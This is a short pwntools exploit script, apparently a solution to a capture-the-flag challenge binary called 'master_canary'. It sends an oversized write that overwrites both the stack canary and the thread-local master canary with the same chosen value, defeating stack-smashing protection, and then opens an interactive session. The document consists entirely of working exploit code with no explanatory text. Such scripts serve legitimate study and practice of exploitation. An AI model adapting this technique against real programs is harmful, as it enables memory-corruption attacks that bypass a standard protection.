from pwn import *

context.update(log_level= 'debug')
p = process('master_canary')

p.recvrepeat(1)
#Create a thread
p.sendline('1')

p.recvrepeat(1)
#Write data
p.sendline('2')

p.recvrepeat(1)

#Send size value
size = 0x818988+8
p.sendline(str(size))

p.recvrepeat(1)

#Send data
canary = 'DEADBEAF'
payload = 'a'*0x108 + canary
payload += '\x00'*(size - len(payload) - 8) + canary
log.info('size: ' + hex(size))
log.info('Payload length: ' + hex(len(payload)))
raw_input('debug : ' + str(p.pid))
p.sendline(payload)

p.interactive()
